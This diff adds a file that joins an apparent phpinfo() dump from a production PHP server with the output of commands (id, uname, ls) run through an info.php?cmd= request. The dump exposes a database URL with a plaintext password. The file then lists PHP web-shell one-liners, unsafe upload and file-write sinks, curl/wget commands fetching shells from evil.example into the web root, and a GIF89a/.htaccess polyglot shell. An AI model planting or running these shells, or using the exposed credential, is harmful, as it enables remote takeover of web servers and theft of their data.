@@ -1,0 +1,44 @@
+PHP Version 7.4.3-4ubuntu2.23 System Linux app-web-1 5.15.0-107-generic #117-Ubuntu SMP x86_64 Build Date Jun 12 2024 09:14:22
+Server API FPM/FastCGI Virtual Directory Support disabled Configuration File (php.ini) Path /etc/php/7.4/fpm Loaded Configuration File /etc/php/7.4/fpm/php.ini
+allow_url_fopen On On allow_url_include On On always_populate_raw_post_data Off Off arg_separator.input &amp; &amp; arg_separator.output &amp; &amp;
+disable_functions pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,passthru
+display_errors On On display_startup_errors On On doc_root no value no value docref_ext no value no value docref_root no value no value
+error_log /var/log/php/error.log /var/log/php/error.log error_reporting 32767 32767 expose_php On On extension_dir /usr/lib/php/20190902 /usr/lib/php/20190902
+file_uploads On On highlight.comment #FF8000 #FF8000 highlight.default #0000BB #0000BB highlight.html #000000 #000000 highlight.keyword #007700 #007700 highlight.string #DD0000 #DD0000
+max_execution_time 30 30 max_file_uploads 20 20 max_input_nesting_level 64 64 max_input_time 60 60 max_input_vars 1000 1000 memory_limit 128M 128M
+open_basedir no value no value output_buffering 4096 4096 output_encoding no value no value post_max_size 8M 8M register_argc_argv Off Off
+report_memleaks On On report_zend_debug On On request_order GP GP sendmail_from no value no value sendmail_path /usr/sbin/sendmail -t -i /usr/sbin/sendmail -t -i
+serialize_precision -1 -1 session.auto_start Off Off session.cache_expire 180 180 session.cache_limiter nocache nocache session.cookie_domain no value no value
+session.cookie_httponly no value no value session.cookie_lifetime 0 0 session.cookie_path / / session.cookie_samesite no value no value session.cookie_secure Off Off
+session.gc_divisor 1000 1000 session.gc_maxlifetime 1440 1440 session.gc_probability 1 1 session.name PHPSESSID PHPSESSID session.referer_check no value no value
+session.save_handler files files session.save_path /var/lib/php/sessions /var/lib/php/sessions session.serialize_handler php php session.sid_bits_per_character 5 5
+short_open_tag Off OffSMTP localhost localhost smtp_port 25 25 sql.safe_mode Off Off track_errors Off Off unserialize_callback_func no value no value
+upload_max_filesize 2M 2M upload_tmp_dir no value no value user_dir no value no value user_ini.cache_ttl 300 300 user_ini.filename .user.ini .user.ini
+variables_order GPCS GPCS xmlrpc_error_number 0 0 xmlrpc_errors Off Off zend.assertions 1 1 zend.detect_unicode On On zend.enable_gc On On
+zend.multibyte Off Off zend.script_encoding no value no value zend.signal_check Off Off
+Registered PHP Streams https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar, zip
+Registered Stream Socket Transports tcp, udp, unix, udg, ssl, tls, tlsv1.0, tlsv1.1, tlsv1.2, tlsv1.3
+Registered Stream Filters zlib.*, convert.iconv.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk
+Zend Engine v3.4.0, Copyright (c) Zend Technologies with Zend OPcache v7.4.3, Copyright (c), by Zend Technologies
+PHP Credits PHP Group Thies C. Arntzen, Stig Bakken, Shane Caraveo, Andi Gutmans, Rasmus Lerdorf, Sam Ruby, Sascha Schumann, Zeev Suraski, Jim Winstead, Andrei Zmievski
+PHP License This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group
+$_SERVER['DOCUMENT_ROOT'] /var/www/html $_SERVER['REMOTE_ADDR'] 203.0.113.9 $_SERVER['REMOTE_PORT'] 51842 $_SERVER['SERVER_SOFTWARE'] Apache/2.4.41 (Ubuntu)
+$_SERVER['GATEWAY_INTERFACE'] CGI/1.1 $_SERVER['SERVER_PROTOCOL'] HTTP/1.1 $_SERVER['REQUEST_METHOD'] GET $_SERVER['QUERY_STRING'] cmd=id
+$_SERVER['REQUEST_URI'] /info.php?cmd=id $_SERVER['SCRIPT_NAME'] /info.php $_SERVER['SCRIPT_FILENAME'] /var/www/html/info.php
+$_SERVER['PHP_SELF'] /info.php $_SERVER['REQUEST_TIME_FLOAT'] 1752742128.4412 $_SERVER['REQUEST_TIME'] 1752742128
+$_ENV['HOSTNAME'] app-web-1 $_ENV['PATH'] /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $_ENV['HOME'] /var/www
+$_ENV['DATABASE_URL'] postgres://deploy:Pr0dDBpass!@db.internal:5432/appdb $_ENV['APP_ENV'] production
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux app-web-1 5.15.0-107-generic #117-Ubuntu SMP Fri Apr 26 12:26:49 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+total 84 drwxr-xr-x 6 www-data www-data 4096 Jul 18 09:41 . drwxr-xr-x 4 root root 4096 Jul 15 11:20 .. -rw-r--r-- 1 www-data www-data 882 Jul 17 14:22 index.php
+-rw-r--r-- 1 www-data www-data 2210 Jul 16 18:03 config.php -rw-r--r-- 1 www-data www-data 1033 Jul 16 09:12 info.php drwxr-xr-x 2 www-data www-data 4096 Jul 15 22:47 admin
+drwxr-xr-x 3 www-data www-data 4096 Jul 15 11:30 vendor drwxr-xr-x 8 www-data www-data 4096 Jul 15 11:30 wp-content
+-eval(base64_decode($_POST['e']));- -phpinfo();- phpversion() PHP_EOL php_uname()
+assert($_REQUEST['pass']) call_user_func($_GET['f'], $_GET['x']) create_function('$a', 'eval($a);')
+preg_replace('/.*/e', $_POST['code'], '') shell_exec($_GET['cmd']) system($_REQUEST[0]) passthru($_GET[1]) exec($_POST[2]) popen($_GET[3], 'r') proc_open($_POST[4], $d, $p)
+move_uploaded_file($_FILES['f']['tmp_name'], '/var/www/html/uploads/' . $_FILES['f']['name'])
+file_put_contents('/var/www/html/x.php', base64_decode($_POST['d'])) fwrite(fopen('/var/www/html/1.php', 'w'), $_POST['c'])
+include $_GET['page'] . '.php' include_once $_REQUEST['inc'] require $_POST['tpl'] require_once $_GET['mod']
+curl http://evil.example/shell.txt -o /tmp/s.php wget -q http://evil.example/wso.php -O /var/www/html/w.php
+eval($_POST['x'])@assert($_POST['x'])@eval(@$_POST['x'])<?php @eval($_REQUEST['c']);?>
+GIF89a; <?php system($_GET['cmd']); ?> .htaccess: AddType application/x-httpd-php .jpg
